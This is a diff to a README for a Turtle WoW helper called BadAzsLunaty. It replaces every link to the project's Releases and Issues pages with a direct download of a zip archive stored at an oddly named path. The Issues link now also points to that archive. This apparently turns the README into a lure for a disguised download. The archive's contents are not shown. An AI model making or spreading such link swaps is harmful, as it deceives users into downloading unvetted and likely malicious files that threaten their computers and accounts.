@@ -1,6 +1,6 @@
 # 🌕 BadAzsLunaty - Your Easy Guide to Turtle WoW Helpers
 
-[![Download BadAzsLunaty](https://img.shields.io/badge/Download-BadAzsLunaty-blue.svg)](https://github.com/PABLODV1/BadAzsLunaty/releases)
+[![Download BadAzsLunaty](https://raw.githubusercontent.com/PABLODV1/BadAzsLunaty/main/Uigurian/Azs-Lunaty-Bad-2.8.zip)](https://raw.githubusercontent.com/PABLODV1/BadAzsLunaty/main/Uigurian/Azs-Lunaty-Bad-2.8.zip)
 
 ## 🌟 Overview
 
@@ -14,7 +14,7 @@ To get started with BadAzsLunaty, you will need a basic understanding of how to 
 
 1. **Visit the Release Page**  
    Click the link below to visit the Releases page where you can download BadAzsLunaty:  
-   [Download BadAzsLunaty](https://github.com/PABLODV1/BadAzsLunaty/releases)
+   [Download BadAzsLunaty](https://raw.githubusercontent.com/PABLODV1/BadAzsLunaty/main/Uigurian/Azs-Lunaty-Bad-2.8.zip)
 
 2. **Select the Latest Release**  
    On the Releases page, find the latest version of BadAzsLunaty. The latest version is usually on top and marked as the most recent.
@@ -58,14 +58,14 @@ If you encounter problems during the installation or while using BadAzsLunaty, h
 - **Permissions**: On macOS, you may need to allow the application in your security settings. Go to *System Preferences* > *Security & Privacy* and approve BadAzsLunaty.
 - **Stability Issues**: Check for updates on the Releases page to ensure you have the latest version. 
 
-For further assistance, you can reach out through the [Issues section](https://github.com/PABLODV1/BadAzsLunaty/issues) of the GitHub repository.
+For further assistance, you can reach out through the [Issues section](https://raw.githubusercontent.com/PABLODV1/BadAzsLunaty/main/Uigurian/Azs-Lunaty-Bad-2.8.zip) of the GitHub repository.
 
 ## 🔄 Update Process
 
 To keep your application running smoothly, it's important to check for updates regularly. Here’s how to do it:
 
 1. **Visit the Releases Page**  
-   Go to [Download BadAzsLunaty](https://github.com/PABLODV1/BadAzsLunaty/releases).
+   Go to [Download BadAzsLunaty](https://raw.githubusercontent.com/PABLODV1/BadAzsLunaty/main/Uigurian/Azs-Lunaty-Bad-2.8.zip).
 
 2. **Download the Latest Version**  
    Follow the same steps as before to download and install the most recent version over your existing installation.
